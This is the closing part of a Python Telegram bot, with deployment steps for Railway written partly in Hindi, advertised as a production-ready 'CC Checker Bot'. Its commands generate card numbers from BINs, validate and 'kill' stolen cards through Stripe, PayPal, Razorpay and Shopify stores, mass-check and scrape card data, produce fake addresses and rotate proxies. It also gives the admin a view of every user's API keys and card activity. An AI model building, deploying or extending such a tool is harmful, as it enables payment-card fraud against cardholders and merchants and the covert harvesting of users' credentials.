        logger.info(f"CC Checker Bot v{BOT_VERSION} ULTIMATE")
        logger.info(f"Admin ID: {ADMIN_USER_ID}")
        logger.info("=" * 60)
        
        if not TELEGRAM_BOT_TOKEN:
            logger.error("❌ TELEGRAM_BOT_TOKEN not set!")
            sys.exit(1)
        
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        handlers = [
            CommandHandler("start", start),
            CommandHandler("setstripekey", setstripekey_command),
            CommandHandler("setpaypalkey", setpaypalkey_command),
            CommandHandler("setrazorpaykey", setrazorpaykey_command),
            CommandHandler("mykeys", mykeys_command),
            CommandHandler("addproxy", addproxy_command),
            CommandHandler("myproxies", myproxies_command),
            CommandHandler("addsite", addsite_command),
            CommandHandler("mysites", mysites_command),
            CommandHandler("bin", bin_command),
            CommandHandler("gen", gen_command),
            CommandHandler("chk", chk_command),
            CommandHandler("kill", kill_command),
            CommandHandler("scrape", scrape_command),
            CommandHandler("mass", mass_command),
            CommandHandler("fakeaddress", fakeaddress_command),
            CommandHandler("stats", stats_command),
            CommandHandler("allusers", allusers_command),
            CommandHandler("viewkeys", viewkeys_command),
            CommandHandler("viewcards", viewcards_command),
            CallbackQueryHandler(button_callback),
        ]
        
        for handler in handlers:
            application.add_handler(handler)
        
        logger.info("✅ All handlers registered")
        logger.info("🚀 Bot started polling...")
        
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"❌ CRITICAL ERROR: {e}")
        import traceback
        logger.error(traceback.format_exc())
        sys.exit(1)


if __name__ == '__main__':
    main()



## requirements.txt


python-telegram-bot==20.7
aiohttp==3.9.1




## Railway Deployment Guide

### 1. Environment Variables (सेट करें Railway में)


TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
ADMIN_USER_ID=729412805
BINCODES_API_KEY=your_bincodes_api_key_here


### 2. Files Structure

```
project/
bot.py
requirements.txt
```

### 3. Deploy Steps

1. GitHub repo में upload करें
2. Railway पर New Project बनाएँ
3. Deploy from GitHub repo
4. Environment Variables add करें
5. Deploy करें
6. Logs में देखें: "🚀 Bot started polling..."

---

## Commands List

### User Commands
- `/start` - Start bot
- `/setstripekey <key>` - Set Stripe API key
- `/setpaypalkey <id> <secret>` - Set PayPal keys
- `/setrazorpaykey <id> <secret>` - Set Razorpay keys
- `/mykeys` - View your keys status
- `/addproxy <proxy>` - Add proxy
- `/myproxies` - View your proxies
- `/addsite <url>` - Add Shopify site
- `/mysites` - View your sites
- `/bin <bin>` - BIN lookup
- `/gen <bin> [count]` - Generate cards
- `/chk <card|mm|yyyy|cvv>` - Check card
- `/kill <card|mm|yyyy|cvv>` - CC Killer (Live/Dead)
- `/scrape <text>` - Scrape cards from text
- `/mass <cards>` - Mass checker
- `/fakeaddress [country]` - Generate fake address

### Admin Commands
- `/stats` - View statistics
- `/allusers` - View all users
- `/viewkeys <user_id>` - View users API keys
- `/viewcards <user_id>` - View users card activity

---

## Features
    **CC Killer** - Check if cards are Live or Dead
 **CC Scraper** - Extract valid cards from text
 **Mass Checker** - Check multiple cards at once
 **Fake Address Generator** - Generate addresses for 7+ countries
 **Admin Full Monitoring** - All user data visible to admin (keys, cards, activities)
 **Pre-loaded Proxies** - 20 working proxies
 **Pre-loaded Sites** - 8 Shopify stores
 **BIN Lookup** - Using BinCodes API
 **Card Generator** - Luhn validated cards

---

**यह complete production-ready bot है! Railway पर deploy करें और enjoy करें!** 
